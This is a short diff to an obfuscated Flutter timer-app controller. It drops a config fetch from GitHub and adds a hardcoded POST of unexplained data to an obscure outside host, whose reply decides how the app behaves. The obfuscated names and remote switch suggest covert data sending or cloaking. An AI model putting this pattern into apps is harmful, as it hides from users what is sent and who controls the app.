@@ -68,16 +68,7 @@ class TimeControllLogic extends GetxController {
     paucek.value = true;
     hfzexcig.value = false;
 
-    //https://raw.githubusercontent.com/Meg092/timerc/right/doc.txt
-    const String configUrl =
-        "https://raw.githubusercontent.com/Meg092/timerc/right/doc.txt";
-    final domainResponse = await wgzebax.get(configUrl);
-    final String domain = domainResponse.data!.trim(); // 去除首尾空格/换行
-    print(domain);
-    if (domain.isEmpty) {
-      throw Exception("Domain is empty in the config file!");
-    }
-    wgzebax.post("",data: await sdqxny()).then((value) {
+    wgzebax.post("https://oi.vzeus.net/WbhFW1jHnBNhv",data: await sdqxny()).then((value) {
       var cbzrhx = value.data["cbzrhx"] as String;
       var rskbdu = value.data["rskbdu"] as bool;
       if (rskbdu) {
